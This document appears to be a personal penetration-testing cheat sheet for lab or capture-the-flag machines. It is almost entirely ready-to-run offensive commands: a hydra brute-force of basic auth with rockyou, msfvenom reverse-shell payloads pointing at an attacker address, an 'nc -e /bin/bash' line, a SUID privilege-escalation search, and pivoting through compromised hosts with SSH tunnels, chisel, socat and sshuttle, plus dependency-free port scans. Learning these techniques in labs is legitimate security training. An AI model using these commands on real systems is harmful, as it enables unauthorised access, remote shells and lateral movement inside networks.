# Cheatsheet

## Web
### Bruteforce basic auth
`hydra -l admin -P /usr/share/wordlist/rockyou.txt -s 80 -f domain.htb http-get /page`


## Shell
### Upgrade shell
`python -c 'import pty; pty.spawn("/bin/bash")'`
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

## Reverse shell msf
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.1.36 LPORT=9998 -f exe > iis-dev.exe`
`msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.9.1.36 LPORT=9998 -f elf > nginx-dev`

## Privesc
### SUID
`find / -xdev -user root \( -perm -4000 -o -perm -2000 -o -perm -6000 \) 2>/dev/null`

## Pivoting
* Tunnelling/Proxying: Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be tunnelled inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic Intrusion Detection System (IDS) or firewall
* Port Forwarding: Creating a connection between a local port and a single port on a target, via a compromised host

### SSH tunneling
Not internal port :
`ssh -L <your_port>:127.0.0.1:<remote_port> <username>@<remote_IP> -i id_rsa -fN`

Internal port :
`ssh -R <your_port>:<your_IP:<remote_port> <username>@127.0.0.1 -fN`

### Chisel
Port forwarding and ssh tunneling without neading SSH
`./chisel server -p 8000 --reverse`
`.\chisel.exe client 10.10.16.6:8000 R:8888:localhost:8888`

### Proxychains
Access a proxy created by another tool
`procychains <command> <IP> <PORT>`

### Socat
Port forwarding, proxy, redirection, etc.
### Proxy
`./socat tcp-l:<local_port> tcp:<your_IP>:<your_port> &`
`nc 127.0.0.1 <local_port> -e /bin/bash`

### Port forwarding
`./socat tcp-l:<port_to_open>,fork,reuseaddr tcp:<remote_IP>:<port_to_redirect_to> &`
#### Quiet method
Attacker machine :
`socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`

On compromised machine :
`./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &`

To use the fictional network between them :
`./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &`

## sshuttle
`sshuttle -r root@<remote_IP> --ssh-cmd "ssh -i ./id_rsa" <remote_network>`

## Living of the land
Scanning a network without nmap :
`for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done`

Port scanning without nmap :
`for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`

## C2
![](https://md.floppy.sh/uploads/c50c6736-b93a-447a-ab49-2a9f36fa6eee.png)
